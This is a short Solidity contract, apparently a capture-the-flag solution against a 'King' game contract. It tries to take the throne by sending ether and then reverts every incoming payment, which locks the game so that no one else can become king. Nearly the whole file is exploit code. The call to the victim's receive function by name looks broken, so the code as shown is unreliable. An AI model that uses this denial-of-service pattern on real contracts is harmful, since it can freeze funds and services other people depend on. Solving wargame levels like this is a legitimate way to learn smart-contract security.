// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/King/King.sol";

contract KingExploit {
    King victim;

    constructor(address _victim) {
        victim = King(payable(_victim));
    }

    function hack() public payable {
        // Become the king by sending 1 ether
        require(msg.value >= 1 ether, "Need to send at least 1 ether");
        victim.receive{value: msg.value}();
    }

    // This fallback function will revert any attempts to send Ether to this contract
    receive() external payable {
        revert("Cannot accept Ether");
    }
}